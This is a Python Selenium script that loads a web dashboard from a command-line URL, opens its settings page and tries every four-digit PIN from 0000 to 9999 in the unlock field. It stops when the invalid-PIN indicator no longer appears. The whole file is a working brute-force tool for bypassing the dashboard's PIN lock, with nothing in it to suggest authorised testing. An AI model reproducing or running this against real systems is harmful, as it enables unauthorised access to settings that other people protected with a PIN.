from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
import time
import sys

print("This might take a while. A maximum of about 1 hour. You will see the tested pins in a list.")
driver = webdriver.Firefox()
lmfao=driver.get(sys.argv[1])
time.sleep(2)
el=driver.find_element(By.XPATH, "//a[@href='#dashboard-settings-page']")
el.click()
time.sleep(1)
field=driver.find_element(By.XPATH, "//input[@type='password']")
butt=driver.find_element(By.XPATH, "//a[@l10n-path='settings.unlock']")
for x in range(0,10000):
    i=str(x).rjust(4,"0")
    print(i)
    field.click()
    field.send_keys(i)
    butt.click()
    time.sleep(0.3)

    try:
        driver.find_element(By.CSS_SELECTOR, "input.dashboard-pin-invalid") 
        time.sleep(0.1)

    except:
        print(str(i) + " <-- pin found, woohoo (or if this is not the pin, CSS is slow)")
        break
